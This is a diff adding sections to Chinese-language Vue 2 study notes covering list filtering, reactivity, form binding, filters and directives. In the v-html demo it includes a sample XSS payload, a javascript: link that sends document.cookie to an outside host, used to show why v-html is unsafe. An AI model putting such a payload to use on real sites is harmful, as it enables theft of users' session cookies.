@@ -101,7 +101,10 @@ html引入.js
 
 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件、…）
 
-写法：如：v-bind:href=“xxx”或简写为:href=“xxx”,xxx同样要写js表达式。  
+写法：
+
+1. `v-bind:href=“xxx”`或简写为`:href=“xxx”`,xxx同样要写js表达式。  
+2. `v-bind:[yyy]=“xxx”` 或简写 `:[yyy]=“xxx”` 被`[]`括起来的会被作为一个指令的参数的js表达式
 
 ```html
 <body>
@@ -109,6 +112,8 @@ html引入.js
         {{name.toUpperCase()}}
         <a :href="url.toUpperCase()">尚硅谷1</a>
         <a :href="Iterate.url">尚硅谷2</a>
+        <a :[aa]="Iterate.url">尚硅谷2</a>
+
     </div>
 <script>
     const vm=new Vue({
@@ -118,7 +123,8 @@ html引入.js
             url:'http://www.baidu.com',
             Iterate:{
                 url:'http://www.blibli.com'
-            }
+            },
+            aa:'href'
         }
     })
 </script>    
@@ -142,7 +148,7 @@ Vue中有2种数据绑定的方式：
 
 ![image-20211205225426038](vue.assets/image-20211205225426038.png)
 
-```js
+```html
 <body>
     <div id="root">
         <!-- 普通写法 -->
@@ -234,7 +240,7 @@ data与el写法：
 
 
 
-## 5、 Vue 数据代理
+## 5、 ==**Vue 数据代理**==
 
 1. Vue中的数据代理：
 
@@ -271,10 +277,12 @@ data与el写法：
 </body>
 ```
 
-```js
-vm._data===data
-true
-```
+
+
+_data是对data升级，其中升级步骤如下：
+
+1. 加工data（就能响应式了）
+2. vm._data=data
 
 _data是对data升级，其中代理规则如下：
 
@@ -627,7 +635,7 @@ Vue中的事件修饰符：
 
 备注：
 
-1. Vue自身可以检测对象内部值的改变，但Vue提供的watch默认不可以
+1. Vue自身可以检测对象内部值的改变，但Vue提供的watch==**默认不可以**==
 2. 使用watch时根据数据的具体结构，决定是否采用深度监视。
 
 ```html
@@ -762,7 +770,7 @@ computed和watch之间的区别：
         <div class="basic" :class="yangshiObj">{{name}}</div><br><br>
         <!-- style绑定样式-对象写法。 -->
         <div class="basic" :style="styleObj1">{{name2}}</div><br><br>
-        <!-- style绑定样式-s数组写法。 -->
+        <!-- style绑定样式-数组写法。 -->
         <div class="basic" :style="[styleObj1,styleObj2]">{{name2}}</div><br><br>
     </div>
     <script>
@@ -900,6 +908,7 @@ v-for指令
 1. 用于展示列表数据
 2. 语法：v-for="(item,(index or key)) in xxx" :key="yyy"
 3. 可遍历：数组、对象、字符串（不常用）、指定次数（不常用）  
+4. `v-for` 的优先级比 `v-if` 更高，这意味着 `v-if` 将分别重复运行于每个 `v-for` 循环中。
 
 
 
@@ -1018,45 +1027,587 @@ v-for指令
 
    
 
+### 9.4、应用（列表过滤、排序）
+
+1. watch和computed实现列表过滤：
+
+   ```html
+   <body>
+       <div id="root">
+           <h2>人员列表</h2>
+           <input type="text" placeholder="请输入名字" v-model="keyWord">
+           <ul>
+               <li v-for="(p,index) of filPersons" :key="filPersons.id">
+                   {{p.name}}--{{p.age}}--{{p.sex}}
+               </li>
+           </ul>
+       </div>
+       <script>
+           const vm=new Vue({
+               el:'#root',
+               data:{
+                   keyWord:"",
+                   persons:[
+                       {id:'01',name:'马冬梅',age:19,sex:'女'},
+                       {id:'02',name:'周冬雨',age:20,sex:'女'},
+                       {id:'03',name:'周杰伦',age:21,sex:'男'},
+                       {id:'04',name:'温兆伦',age:22,sex:'男'},
+                   ],
+                   filPersons:[]
+               },
+               // watch:{
+               //     keyWord:{
+               //         immediate:true,
+               //         handler(val){
+               //             //indexOf('') 结果为0，所以匹配全部 所以immediate:true
+               //             this.filPersons=this.persons.filter(item => {
+               //                 return item.name.indexOf(val)!=-1
+               //             });
+                           
+               //         }
+                       
+               //     }
+               // }
+               computed:{
+                   filPersons:{
+                       get(){
+                           return this.persons.filter((p)=>{
+                               return p.name.indexOf(this.keyWord)!=-1
+                           })
+                       }
+                   }
+               }
+           });
+   ```
+
+   2. computed实现排序
+
+   ```html
+   <body>
+       <div id="root">
+           <h2>人员列表</h2>
+           <input type="text" placeholder="请输入姓名" v-model="keyWord">
+           <button @click="sortType=0">原序</button>
+           <button @click="sortType=1">顺序</button>
+           <button @click="sortType=2">倒序</button>
+           <br><br>
+           <ul>
+               <li v-for="(p,index) in tmpPersons" :key="p.id">
+                   {{p.name}}--{{p.age}}--{{p.sex}}
+               </li>
+           </ul>
+       </div>
+       <script>
+           const vm=new Vue({
+               el:'#root',
+               data:{
+                   keyWord:"",
+                   sortType:0,
+                   persons:[
+                       {id:'03',name:'周杰伦',age:21,sex:'男'},
+                       {id:'01',name:'马冬梅',age:19,sex:'女'},
+                       {id:'02',name:'周冬雨',age:20,sex:'女'},
+                       {id:'04',name:'温兆伦',age:22,sex:'男'},
+                   ],
+                   //tmpPersons:[],
+               },
+               
+               computed:{
+                   tmpPersons(){
+                       const arr= this.persons.filter((p)=>{
+                           return p.name.indexOf(this.keyWord)!=-1
+                       });
+                       if(this.sortType){
+                           return arr.sort((p1,p2)=>{
+                               return this.sortType===1 ? p1.age-p2.age :p2.age-p1.age;
+                           });
+                       }else{
+                           return arr;
+                       }
+                   }
+               }
+           })
+          
+       </script>
+   </body>
+   ```
+
+   
+
+## 10、数据监视
+
+Vue监视数据的原理：
+
+1. vue会监视data中所有层次的数据。
+
+2. 如何检测==**对象**==中的数据？
+
+   ​		通过setter实现监视，且要在new Vue时就传入要监测的数据。
+
+   1. 对象中后追加的属性，Vue默认不做响应式处理。
+   2. 如需给==**后添加的属性做响应式**==，请使用如下API：
+      1. `Vue.set(target.propertyName/index,value)` 或 `vm.$set(target.propertyName/index,value)`
+
+3. 如何监测==**数组**==中的数据？
+
+   ​		通过包裹数组更新元素的方法实现，本质就是做了两件事：
+
+   		1. 调用原生对象的方法对数组进行更新。
+   		2. 重新解析模板，进而更新页面。
+
+  4.   在Vue==**修改数组中的某个元素一定要用如下方法**==：
+
+         1. 使用这些API：`push()、shift()unshift()、splice()、sort()、reverse()` 或 `Vue.set()` 或 `vm.$set()`
+
+特别注意：`Vue.set()` 和 `vm.$set()` 不能给 `vm` 或 `vm的根数据对象`（就是直接在vm上或_data上 加 是不行的） 添加属性。！！！
 
 
 
+模拟Vue监测数据原理：
+
+```js
+
+let data={
+    name:'模拟Vue的数据监测',
+    address:'China',
+    a:'哈'
+}
+const obs =new Observer(data);
+let vm={};
+vm._data=data=obs;
+function Observer(obj){
+    const keys=Object.keys(obj);
+    keys.forEach(k => {
+        Object.defineProperty(this,k,{
+            get(){
+                return obj[k];
+            },
+            set(val){
+                obj[k]=val;
+            }
+        })
+    });
+}
+
+
+```
+
+测试例子如下：
+
+```html
+<body>
+    <div id="root">
+        <h1>学生信息</h1>
+        <button @click="student.age++">年龄+1岁</button><br>
+        <button @click="addSex">添加性别属性，默认值：男</button><br>
+        <button @click="student.sex='未知'">修改性别（请添加完，后修改不然不是响应式）</button><br>
+        <button @click="addFriend">在列表首位添加一个朋友</button><br>
+        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button><br>
+        <button @click="addHobby">添加一个爱好</button><br>
+        <button @click="updateHobby">修改第一个爱好为：开车</button><br>
+
+        <h3>姓名：{{student.name}}</h3>
+        <h3>年龄：{{student.age}}</h3>
+        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
+        <h3>爱好：</h3>
+        <ul>
+            <li v-for="(h,index) in student.hobby" :key="index">
+                {{h}}
+            </li>
+        </ul>
+        <h3>朋友们：</h3>
+        <ul>
+            <li v-for="(f,index) in student.friends" ::key="index">
+                {{f.name}}--{{f.age}}
+            </li>
+        </ul>
+    </div>
+    <script>
+        // #region 
+        const vm=new Vue({
+            el:'#root',
+            data:{
+                student:{
+                    name:'tom',
+                    age:18,
+                    hobby:['抽烟','喝酒','烫头'],
+                    friends:[
+                        {name:'jerry',age:35},
+                        {name:'tony',age:36}
+                    ]
+                }
+            },
+            methods:{
+                addSex(){
+                    //后添加属性 针对对象
+                    //Vue.set(this.student, 'sex', '男');
+                    this.$set(this.student, 'sex', '男');
+                },
+                addFriend(){
+                    this.student.friends.unshift({name:'Ailisi',age:35});
+                },
+                updateFirstFriendName(){
+                    this.student.friends[0].name='张三';
+                },
+                updateHobby(){
+                    //针对数组 两种方式
+                    //this.student.hobby.splice(0,1,'开车');
+                    Vue.set(this.student.hobby, 0, '开车');
+                },
+                addHobby(){
+                    this.student.hobby.push('学习');
+                }
+            }
+        })
+        //#endregion 
+        new 
+    </script>
+</body>
+```
 
 
 
+## 11、收集表单数据
+
+收集表单数据
+
+若：`<input type="text">`，则v-model收集的是value值，用户输入的就是value值。
+
+若：`<input type="radio">`，则v-model收集的是value值，且要给标签配置value值。
+
+若：`<input type="checkbox">`
+
+		1. 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是 布尔值）
+		2. 配置input的value属性：
+	     		1. v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是 布尔值）
+	     		2. v-model的初始值是数组，那么收集的就是value组成的数据。
+
+备注：v-model：的三个修饰符：
+
+​		lazy：失去焦点再收集数据
+
+​		number：输入字符串转为有效的数字
+
+​		trim：==**输入首尾空格过滤**==
+
+ ```html
+ <body>
+     <div id="root">
+         <!-- 阻止提交跳转 -->
+         <form @submit.prevent="demo">
+             <!-- <label for="count">账号：</label> -->
+             账号：<input type="text" v-model.trim="userInfo.account" ><br><br>
+             密码：<input type="text" v-model.trim="userInfo.pwd"><br><br>
+             年龄：<input type="number" v-model.number="userInfo.age"><br><br>
+             性别：
+             男：<input type="radio" name="sex" v-model="userInfo.gender" value="male">
+             女：<input type="radio" name="sex" v-model="userInfo.gender" value="female"><br><br>
+             爱好：
+             学习  <input type="checkbox" v-model="userInfo.hobby" value="study">
+             打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
+             吃饭  <input type="checkbox" v-model="userInfo.hobby" value="eat"><br><br>
+             所属校区:
+             <select v-model="userInfo.city">
+                 <option value="">请选择校区</option>
+                 <option value="beijing">北京</option>
+                 <option value="shanghai">上海</option>
+                 <option value="shenzhen">深圳</option>
+                 <option value="wuhan">武汉</option>
+             </select><br><br>
+             其它信息：
+             <textarea v-model.lazy="userInfo.other"></textarea><br><br>
+             <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.baidu.com">《用户协议》</a><br><br>
+             <button>提交（默认类型为submit）</button>
+         </form>
+     </div>
+ </body>
+     <script>
+         const vm=new Vue({
+             el:'#root',
+             data:{
+                 userInfo:{
+                     account:'',
+                 pwd:'',
+                 gender:'female',
+                 age:null ,
+                 hobby:[],
+                 city:'',
+                 other:'',
+                 agree:''
+                 }
+             },
+             methods: {
+                 demo(){
+                     console.log(JSON.stringify(this.userInfo))
+                 }
+             },
+         })
+     </script>
+ </html>
+ ```
+
+## 12、过滤器
+
+过滤器：
+
+定义：对要显示的数据继续宁特定格式化后再显示（适用于一些简单的处理）
+
+注册过滤器：
+
+1. 注册全局过滤器：`Vue.filter(name,callback)`  
+2. 注册局部过滤器： `new Vue(filters:{})`
+
+用法：
+
+​		`{{xxx | 过滤器名}}` 或 `v-bind:属性="xxx | 过滤器名"`  （可以连串）`v-model不行`
+
+备注：
+
+1. 锅炉其也可以接收额外参数、多个过滤器也可以串联
+2. 并没有改变原本的数据，是产生新的对应的数据。
 
 
 
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>
+    <script src="../js/vue.js"></script>    
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js"></script>
+    
+</head>
+<body>
+    <div id="root">
+        <h3>时间戳：{{timestamp}}</h3>
+        <h3>过滤后的时间：{{timestamp | timeFormater}}</h3>
+        <h3>过滤后的时间（传参）：{{timestamp | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
+        <h3 :x="msg | mySlice">全局</h3>
+        <!-- 这下不能这么玩 -->
+        <!-- <input type="text" v-model="msg | mySlice"> -->
+    </div>
+
+</body>
+<script>
+    Vue.filter('mySlice',function(value){
+        return value.slice(0,4);
+    });
+    const vm=new Vue({
+        el:'#root',
+        data:{
+            msg:'12345',
+            timestamp:new Date().getTime(),
+        },
+        //这是实时动态时间的
+        // methods:{
+        //     getTime(){
+        //         setInterval(() => {
+        //             this.timestamp=new Date().getTime();
+        //         }, 1000);
+        //     }
+        // },
+        // created(){
+        //     this.getTime();
+        // },
+
+        filters:{
+            timeFormater(value,str='YYYY年MM月DD日HH:mm:ss'){
+                return dayjs(value).format(str);
+            }
+        }
+    })
+</script>
+</html>
+```
 
 
 
+## 13、内置指令
 
+v-bind：单向数据绑定 
 
+v-model：双向数据绑定
 
+v-for：遍历数组、对象、字符串
 
+v-on：绑定事件
 
+v-if：条件渲染（动态控制节点是否存在）
 
+v-else：条件渲染（动态控制节点是否存在）
 
+v-show：条件渲染（动态控制节点是否展示）
 
+==**v-text指令：**==
 
+1. 作用：向其所在的节点中渲染文本内容。
+2. 与插值语法的区别：v-text会替换掉节点中的内容。
 
+==**v-html指令：**==
 
+1. 作用：向指定节点中渲染包含html结构的内容
+2. 与插值语法的区别：
+   1. v-html会替换掉节点中所有的内容
+   2. v-html可以识别html结构
+   3. 注意：v-html有安全性问题！！！
+      1. 再网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
+      2. 一定要再可信的内容上使用v-html，永不要用再用户提交的内容上！
 
+v-cloak指令（不接受参数）：
 
+1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+2. 使用css配合v-cloak可以解决网速慢时界面展示出{{xxx}}模板的问题。
 
+v-once指令（不接受参数）：
 
+1. v-once所在节点再初次动态渲染后，就视为静态内容了（只解析一次）
+2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
 
+v-pre指令：
 
+1. 通过其所在的节点的编译过程。
+2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
 
+```html
+    <style>
+        /* [v-cloak]{
+            display: none;
+        } */
+    </style>
+</head>
+<body>
+    <div id="root">
+        <!-- v-text -->
+        <div v-text="name">这是什么</div>
+        <!--v-html-->
+        <div v-html="str">好啊</div>
+        <!--v-cloak-->
+        <div v-cloak >{{name}}</div>
+        <!-- v-once -->
+        <div v-once>n:{{n}}</div><br>
+        <div>n:{{n}}</div>
+        <button @click="n++">n+1</button>
+        <!--v-pre-->
+        <div v-pre>跳过简简单单</div>
+    </div>
+</body>
+<script>
+    $('[v-cloak]').css({"display":"none"})
+    setTimeout(() => {
+    const vm=new Vue({
+        el:'#root',
+        data:{
+            name:'内置指令',
+            n:0,
+            str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟快来，这里好多牛牛</a>'
+        }
+    })
+    }, 3000);
+    
+    
+</script>
+```
 
+## 14、自定义指令
 
+一、定义语法：
 
+1. 局部指令：
+   1. `new Vue({directives:{指令名:配置对象}})` 或 `new Vue({directives(){}})`
+2. 全局指令：
+   1. `Vue.directive(指令名，配置对象)` 或 `Vue.directive(指令名，回调函数)`
 
+二、配置对象中常用的3个回调（以及执行顺序）：
 
+(1). bind：指令与元素成功绑定
 
+(2). inserted：指令所在元素被插入页面时调用。
 
+(3). update：指令所在模板结构被重新解析时调用。
 
+三、备注：
 
+(1).指令定义时不加v-，但使用时要加v-；
+
+(2).指令名如果时多个单词，要使用kebab-case命名方式，不要用camelCase命名。
+
+实例解决需求：
+
+需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+
+需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点
+
+```html
+<body>
+    <div id="root">
+        <!-- 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。 -->
+        <h2>{{name}}</h2><br>
+        <h2>当前的n值是：{{n}}</h2><br>
+        <h2>放大10倍后的n值是：<span v-big="n"></span></h2><br>
+        <button @click="n++">点我n+1</button><br>
+        <input type="text"  v-fbind:value="n"><br>
+        <input type="text"><br>
+    </div>
+</body>
+<script>
+    //全局指令
+    Vue.directive('fbind', {
+        bind(el, binding, vnode) {
+            console.log('bind');
+            el.value=binding.value;
+        },
+        inserted(el, binding, vnode) {
+            console.log('inserted');
+
+        },
+        update(el, binding, vnode, oldVnode) {
+            console.log('update');
+            el.value=binding.value;
+            el.focus();
+        },
+        componentUpdated(el, binding, vnode) {
+            console.log('componentUpdated');
+        },
+        unbind(el, binding, vnode) {
+            console.log('unbind');
+        },
+    });
+    const vm=new Vue({
+        el:'#root',
+        data:{
+            name:'自定义指令',
+            n:0,
+        },
+        //局部、简写（包含bind、update 回调函数）
+        directives:{
+            //big函数何时会被调用？1、指令与元素成功绑定时。2、指令所在的模板被重新解析时。
+            big(element,bindInterface,VNode){
+                console.log(VNode)
+                element.innerText=bindInterface.value*10;
+            },
+            // fbind:{
+            //     bind(element,bindInterface){
+            //         console.log('bind')
+            //         element.value=bindInterface.value;
+            //     },
+            //     inserted(element,bindInterface){
+            //         console.log('inserted')
+            //     },
+            //     update(element,bindInterface){
+            //         console.log('update');
+            //         element.value=bindInterface.value;
+            //         element.focus();
+            //     }
+            // }
+            
+        }
+    })
+</script>
+```
 
 
 
